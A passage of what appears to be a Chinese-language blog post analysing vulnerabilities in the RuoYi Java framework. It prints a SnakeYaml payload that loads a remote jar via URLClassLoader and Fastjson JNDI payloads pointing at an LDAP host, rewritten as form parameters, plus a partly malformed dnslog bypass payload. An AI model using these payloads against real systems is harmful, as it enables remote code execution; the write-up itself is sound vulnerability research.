+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invokeMethod</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">methodName</span><span class="p">,</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">[]&gt;</span><span class="w"> </span><span class="n">methodParams</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalArgumentException</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InvocationTargetException</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isNotNull</span><span class="p">(</span><span class="n">methodParams</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">methodParams</span><span class="p">.</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bean</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="n">methodName</span><span class="p">,</span><span class="w"> </span><span class="n">getMethodParamsType</span><span class="p">(</span><span class="n">methodParams</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">,</span><span class="w"> </span><span class="n">getMethodParamsValue</span><span class="p">(</span><span class="n">methodParams</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bean</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="n">methodName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">bean</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>目标类的目标方法因为没有<code>setAccessible(true)</code>​, 所以也需要是public, 因为在获取Method的时候指定了方法的参数的<code>Method method = bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));</code>​, 所以反射调用的方法不需要需要是无参的方法</p>
+<p>所以Runtime类不符合, 可以使用Yaml反序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Yaml</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Constructor</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Representer</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DumperOptions</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LoaderOptions</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Resolver</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">public</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">load</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">yaml</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">T</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">loadFromReader</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StreamReader</span><span class="p">(</span><span class="n">yaml</span><span class="p">),</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">yaml</span><span class="p">.</span><span class="na">snakeyaml</span><span class="p">.</span><span class="na">Yaml</span><span class="p">.</span><span class="na">load</span><span class="p">(</span><span class="err">&#39;</span><span class="o">!!</span><span class="n">javax</span><span class="p">.</span><span class="na">script</span><span class="p">.</span><span class="na">ScriptEngineManager</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URLClassLoader</span><span class="w"> </span><span class="o">[[!!</span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">URL</span><span class="w"> </span><span class="o">[</span><span class="s">&#34;http://127.0.0.1:8080/yaml-payload.jar&#34;</span><span class="o">]]]]</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="fastjson">Fastjson</h2>
+<p>全局搜索<code>parseObject</code>​方法</p>
+<p>在业务层发现调用</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203405.png" alt="image"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="nf">getParams</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">params</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">params</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>反序列化的参数需要是map类型</p>
+<p>查找方法在哪里调用</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203053.png" alt="image"></p>
+<p>可以直接post, 直接post一个params发现有些其他字段不能为空, 依次添加即可</p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203882.png" alt="image"></p>
+<p>假如poc为:<code>{&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.0.107:1389/y0drfh&quot;}</code>​</p>
+<p>就需要改为下面的格式:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">params</span><span class="o">[</span><span class="nd">@type</span><span class="o">]=</span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">jndi</span><span class="p">.</span><span class="na">JndiObjectFactory</span><span class="o">&amp;</span><span class="n">params</span><span class="o">[</span><span class="nd">@resourceName</span><span class="o">]=</span><span class="n">ldap</span><span class="p">:</span><span class="c1">//192.168.0.107:1389/y0drfh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504262203605.png" alt="image"></p>
+<p>但是4.6版本的fastjson版本比这个高, 需要找绕过的poc, 但其poc有嵌套结构, 还不知道如何转换为map的类型</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">[</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Exception&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.alibaba.fastjson.JSONException&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;x&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.net.InetSocketAddress&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;address&#34;</span><span class="p">:,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ccc.4fhgzj.dnslog.cn&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.lang.Exception&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;com.alibaba.fastjson.JSONException&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;message&#34;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;java.net.InetSocketAddress&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;address&#34;</span><span class="p">:,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;ddd.4fhgzj.dnslog.cn&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">]</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+    </div>
+
+    
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/java/">java</a>
+          <a href="/tags/%E8%8B%A5%E4%BE%9D/">若依</a>
+          <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+            <span class="next-text nav-default">SnakeYaml反序列化</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="w0s1np/w0s1np.github.io"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/w0s1np/" class="iconfont icon-github" title="github"></a>
+  
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> site pv: <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> site uv: <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2024 - 
+    2025<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script><script></script><script src="https://cdn.jsdelivr.net/npm/raphael@2.2.7/raphael.min.js" integrity="sha256-67By+NpOtm9ka1R6xpUefeGOY8kWWHHRAKlvaTJ7ONI=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/flowchart.js@1.8.0/release/flowchart.min.js" integrity="sha256-zNGWjubXoY6rb5MnmpBNefO0RgoVYfle9p0tvOQM+6k=" crossorigin="anonymous"></script><script></script><script src="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.js" integrity="sha256-4O4pS1SH31ZqrSO2A/2QJTVjTPqVe+jnYgOWUVr7EEc=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/snapsvg@0.5.1/dist/snap.svg-min.js" integrity="sha256-oI+elz+sIm+jpn8F/qEspKoKveTc5uKeFHNNVexe6d8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/underscore@1.8.3/underscore-min.js" integrity="sha256-obZACiHd7gkOk9iIL/pimWMTJ4W/pBsKu+oZnSeBIek=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/gh/bramp/js-sequence-diagrams@2.0.1/dist/sequence-diagram-min.js" integrity="sha384-8748Vn52gHJYJI0XEuPB2QlPVNUkJlJn9tHqKec6J3q2r9l8fvRxrgn/E5ZHV0sP" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/bramp/js-sequence-diagrams@2.0.1/dist/sequence-diagram-min.css" integrity="sha384-6QbLKJMz5dS3adWSeINZe74uSydBGFbnzaAYmp+tKyq60S7H2p6V7g1TysM5lAaF" crossorigin="anonymous">
+
+
+
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
